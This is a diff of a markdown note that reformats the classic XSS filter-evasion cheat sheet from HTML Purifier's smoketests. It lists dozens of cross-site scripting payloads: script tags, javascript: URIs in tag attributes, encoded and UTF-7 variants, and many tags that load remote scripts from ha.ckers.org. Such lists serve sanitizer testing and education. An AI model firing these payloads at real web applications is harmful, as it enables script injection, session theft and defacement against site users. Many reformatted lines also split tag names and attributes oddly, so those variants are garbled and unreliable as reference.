@@ -1,102 +1,144 @@
 ---
 title: XSS
 description: 'SOURCE: http://htmlpurifier.org/live/smoketests/xssAttacks.php'
-date: '2023-06-12 15:53:01'
-updated: '2023-06-12 15:54:04'
+date: 'Jun 12th, 2023'
+updated: '2023-06-12 15:56:02'
 ---
 
-';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'>
+<SCRIPT>alert(String.fromCharCode(88, 83, 83))</SCRIPT>=&{}
 
-'';!--"<XSS>=&{()}
+'';!--"
+<XSS>
+=&{()}
 
 <SCRIPT>alert('XSS')</SCRIPT>
 
-<SCRIPTSRC=http://ha.ckers.org/xss.js></SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 
-<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<SCRIPT>alert(String.fromCharCode(88, 83, 83))</SCRIPT>
 
-<BASEHREF="javascript:alert('XSS');//">
+<BASE HREF="javascript:alert('XSS');//">
 
-<BGSOUNDSRC="javascript:alert('XSS');">
+<BGSOUND SRC="javascript:alert('XSS');">
 
-<BODYBACKGROUND="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS');">
 
 <BODY ONLOAD=alert('XSS')>
 
-<DIVSTYLE="background-image:url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:url(javascript:alert('XSS'))">
 
-<DIVSTYLE="background-image:url(&#1;javascript:alert('XSS'))">
+<DIVSTYLE
+="background-image:url(&#1;javascript:alert('XSS'))">
 
 <DIV STYLE="width:expression(alert('XSS'));">
 
-<FRAMESET><FRAMESRC="javascript:alert('XSS');"></FRAMESET>
+<FRAMESET>
+<FRAMESRC
+="javascript:alert('XSS');">
+</FRAMESET>
 
-<IFRAMESRC="javascript:alert('XSS');"></IFRAME>
+<IFRAMESRC
+="javascript:alert('XSS');"></IFRAME>
 
-<INPUT TYPE="IMAGE"SRC="javascript:alert('XSS');">
+<INPUT TYPE='IMAGE' SRC="javascript:alert('XSS');">
 
-<IMGSRC="javascript:alert('XSS');">
+<IMGSRC
+="javascript:alert('XSS');">
 
-<IMGSRC=javascript:alert('XSS')>
+<IMGSRC
+=javascript:alert('XSS')>
 
-<IMGDYNSRC="javascript:alert('XSS');">
+<IMGDYNSRC
+="javascript:alert('XSS');">
 
-<IMGLOWSRC="javascript:alert('XSS');">
+<IMGLOWSRC
+="javascript:alert('XSS');">
 
-<IMGSRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<IMGSRC
+='http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode'>
 
-exp/*<XSSSTYLE='no\xss:noxss("*//*");
-xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+exp/*
+<XSSSTYLE
+='no\xss:noxss("*//*");
+xss:&#101;x&#x2F;*XSS*//*/*/pression(alert('XSS'))'>
 
-<STYLE>li {list-style-image:url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+<STYLE>li {
+list-style-image: url("javascript:alert('XSS')");
+}</STYLE>
+<UL>
+<LI>
+XSS
 
-<IMGSRC='vbscript:msgbox("XSS")'>
+<IMGSRC
+='vbscript:msgbox('XSS')'>
 
-<LAYERSRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+<LAYERSRC
+="http://ha.ckers.org/scriptlet.html"></LAYER>
 
-<IMGSRC="livescript:[code]">
+<IMGSRC
+="livescript:[code]">
 
 scriptalert(XSS)/script
-<META HTTP-EQUIV="refresh"CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 
-<META HTTP-EQUIV="refresh"CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 
-<META HTTP-EQUIV="refresh"CONTENT="0;URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;URL=http://;URL=javascript:alert('XSS');">
 
 <IMG SRC="mocha:[code]">
 
-<OBJECTTYPE="text/x-scriptlet"DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<OBJECTTYPE
+="text/x-scriptlet"DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
 
-<OBJECTclassid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=urlvalue=javascript:alert('XSS')></OBJECT>
+<OBJECTclassid
+=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>
+<param name=urlvalue=javascript:alert('XSS')>
+</OBJECT>
 
-<EMBEDSRC="http://ha.ckers.org/xss.swf"AllowScriptAccess="always"></EMBED>
+<EMBEDSRC
+="http://ha.ckers.org/xss.swf"AllowScriptAccess="always"></EMBED>
 
-<STYLETYPE="text/javascript">alert('XSS');</STYLE>
+<STYLETYPE
+="text/javascript">alert('XSS');</STYLE>
 
-<IMGSTYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<IMGSTYLE
+="xss:expr/*XSS*/ession(alert('XSS'))">
 
-<XSSSTYLE="xss:expression(alert('XSS'))">
+<XSSSTYLE
+="xss:expression(alert('XSS'))">
 
-<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><ACLASS=XSS></A>
+<STYLE>.XSS {
+background-image: url("javascript:alert('XSS')");
+}</STYLE>
+<ACLASS
+=XSS></A>
 
-<STYLEtype="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLEtype
+="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
 
-<LINK REL="stylesheet"HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
 
-<LINK REL="stylesheet"HREF="http://ha.ckers.org/xss.css">
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
 
-<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<STYLE>@import 'http://ha.ckers.org/xss.css';</STYLE>
 
-<META HTTP-EQUIV="Link"Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<META HTTP-EQUIV='Link' Content='<http://ha.ckers.org/xss.css>; REL=stylesheet'>
 
-<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<STYLE>BODY {
+-moz-binding: url('http://ha.ckers.org/xssmoz.xml#xss')
+}</STYLE>
 
-<TABLEBACKGROUND="javascript:alert('XSS')"></TABLE>
+<TABLEBACKGROUND
+="javascript:alert('XSS')"></TABLE>
 
-<TABLE><TDBACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+<TABLE>
+<TDBACKGROUND
+="javascript:alert('XSS')"></TD>
+</TABLE>
 
 <HTML xmlns:xss>
-<?importnamespace="xss"implementation="http://ha.ckers.org/xss.htc">
+<?importnamespace='xss'implementation='http://ha.ckers.org/xss.htc'>
 <xss:xss>XSS</xss:xss>
 
 </HTML>
@@ -105,28 +147,28 @@ scriptalert(XSS)/script
 
 </C></X></xml><SPAN DATASRC=#IDATAFLD=C DATAFORMATAS=HTML>
 
-<XML ID="xss"><I><B><IMGSRC="javas<!---->cript:alert('XSS')"></B></I></XML>
+<XML ID='xss'><I><B><IMGSRC="javas<!---->cript:alert('XSS')"></B></I></XML>
 
-<SPANDATASRC="#xss" DATAFLD="B"DATAFORMATAS="HTML"></SPAN>
+<SPANDATASRC='#xss' DATAFLD='B'DATAFORMATAS='HTML'></SPAN>
 
-<XMLSRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<XMLSRC='http://ha.ckers.org/xsstest.xml' ID=I></XML>
 <SPANDATASRC=#I DATAFLD=CDATAFORMATAS=HTML></SPAN>
 
 <HTML><BODY>
-<?xml:namespaceprefix="t"ns="urn:schemas-microsoft-com:time">
+<?xml:namespaceprefix='t'ns='urn:schemas-microsoft-com:time'>
 
-<?importnamespace="t"implementation="#default#time2">
-<t:setattributeName="innerHTML"to="XSS<SCRIPTDEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+<?importnamespace='t'implementation='#default#time2'>
+<t:setattributeName='innerHTML'to="XSS<SCRIPTDEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
 
 <!--[if gte IE4]>
 <SCRIPT>alert('XSS');</SCRIPT>
 <![endif]-->
 
-<METAHTTP-EQUIV="Set-Cookie"Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<METAHTTP-EQUIV='Set-Cookie'Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 
-<XSS STYLE="behavior:url(http://ha.ckers.org/xss.htc);">
+<XSS STYLE='behavior:url(http://ha.ckers.org/xss.htc);'>
 
-<SCRIPTSRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<SCRIPTSRC='http://ha.ckers.org/xss.jpg'></SCRIPT>
 
 <!--#exec cmd="/bin/echo'<SCRIPT SRC'"--><!--#execcmd="/bin/echo'=http://ha.ckers.org/xss.js></SCRIPT>'"-->
 
@@ -210,37 +252,56 @@ echo('IPT>alert("XSS")</SCRIPT>'); ?>
 \u003c
 \u003C
 
-<IMGSRC=JaVaScRiPt:alert('XSS')>
+<IMGSRC
+=JaVaScRiPt:alert('XSS')>
 
-<IMGSRC=javascript:alert(&quot;XSS&quot;)>
+<IMGSRC
+=javascript:alert(&quot;XSS&quot;)>
 
-<IMGSRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMGSRC
+=`javascript:alert("RSnake
+says,
+'XSS'")`>
 
-<IMGSRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMGSRC
+=javascript:alert(String.fromCharCode(88,83,83))>
 
-<IMGSRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMGSRC
+=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 
-<IMGSRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMGSRC
+=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 
-<DIVSTYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIVSTYLE
+="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
 
-<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMGSRC
+=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
 
-<HEAD><METAHTTP-EQUIV="CONTENT-TYPE"CONTENT="text/html;charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<HEAD>
+<METAHTTP-EQUIV
+="CONTENT-TYPE"CONTENT="text/html;charset=UTF-7">
+</HEAD>
++ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 
 \";alert('XSS');//
 
-</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+</TITLE>
+<SCRIPT>alert("XSS");</SCRIPT>
 
 <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
 
-<IMGSRC="jav\tascript:alert('XSS');">
+<IMGSRC
+="jav\tascript:alert('XSS');">
 
-<IMGSRC="jav&#x09;ascript:alert('XSS');">
+<IMGSRC
+="jav&#x09;ascript:alert('XSS');">
 
-<IMGSRC="jav&#x0A;ascript:alert('XSS');">
+<IMGSRC
+="jav&#x0A;ascript:alert('XSS');">
 
-<IMGSRC="jav&#x0D;ascript:alert('XSS');">
+<IMGSRC
+="jav&#x0D;ascript:alert('XSS');">
 
 <IMG
 SRC
@@ -272,70 +333,108 @@ S
 "
 >
 
-<IMGSRC=java\0script:alert("XSS")>
+<IMGSRC
+=java\0script:alert("XSS")>
 
-&<SCR\0IPT>alert("XSS")</SCR\0IPT>
+&
+<SCR
+\0IPT>alert("XSS")</SCR
+\0IPT>
 
 <IMG SRC=" &#14; javascript:alert('XSS');">
 
-<SCRIPT/XSSSRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT
+/XSSSRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
-<BODYonload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODYonload
+!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 
-<SCRIPTSRC=http://ha.ckers.org/xss.js
+<SCRIPTSRC
+=http://ha.ckers.org/xss.js
 
-<SCRIPTSRC=//ha.ckers.org/.j>
+<SCRIPTSRC
+=//ha.ckers.org/.j>
 
-<IMGSRC="javascript:alert('XSS')"
+<IMGSRC
+="javascript:alert('XSS')"
 
-<IFRAMESRC=http://ha.ckers.org/scriptlet.html <
+<IFRAMESRC
+=http://ha.ckers.org/scriptlet.html
+<
 
-<<SCRIPT>alert("XSS");//<</SCRIPT>
+<
+<SCRIPT>alert("XSS");//<</SCRIPT>
 
-<IMG"""><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG""">
+<SCRIPT>alert("XSS")</SCRIPT>
+">
 
-<SCRIPT>a=/XSS/
+<SCRIPT>a = /XSS/
 alert(a.source)</SCRIPT>
 
-<SCRIPT a=">"SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
-<SCRIPT ="blah"SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT
+=
+"
+blah
+"
+SRC
+=
+"
+http://ha.ckers.org/xss.js
+"
+></SCRIPT>
 
-<SCRIPT a="blah" ''SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a="blah"
+''SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
-<SCRIPT "a='>'"SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT
+"a='>'"SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
 <SCRIPT a=`>`SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
-<SCRIPT>document.write("<SCRI");</SCRIPT>PTSRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>
+PTSRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
-<SCRIPT a=">'>"SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
-<AHREF="http://66.102.7.147/">XSS</A>
+<A HREF
+="http://66.102.7.147/">XSS</A>
 
-<AHREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF
+="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
 
-<AHREF="http://1113982867/">XSS</A>
+<A HREF
+="http://1113982867/">XSS</A>
 
-<AHREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF
+="http://0x42.0x0000066.0x7.0x93/">XSS</A>
 
-<AHREF="http://0102.0146.0007.00000223/">XSS</A>
+<A HREF
+="http://0102.0146.0007.00000223/">XSS</A>
 
-<AHREF="h
+<A HREF
+="h
 tt\tp://6&#09;6.000146.0x7.147/">XSS</A>
 
-<AHREF="//www.google.com/">XSS</A>
+<A HREF
+="//www.google.com/">XSS</A>
 
 <A HREF="//google">XSS</A>
 
-<AHREF="http://ha.ckers.org@google">XSS</A>
+<A HREF
+="http://ha.ckers.org@google">XSS</A>
 
-<AHREF="http://google:ha.ckers.org">XSS</A>
+<A HREF
+="http://google:ha.ckers.org">XSS</A>
 
-<AHREF="http://google.com/">XSS</A>
+<A HREF
+="http://google.com/">XSS</A>
 
-<AHREF="http://www.google.com./">XSS</A>
+<A HREF="http://www.google.com./">XSS</A>
 
-<AHREF="javascript:document.location='http://www.google.com/'">XSS</A>
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
 
-<AHREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
+<A HREF
+="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
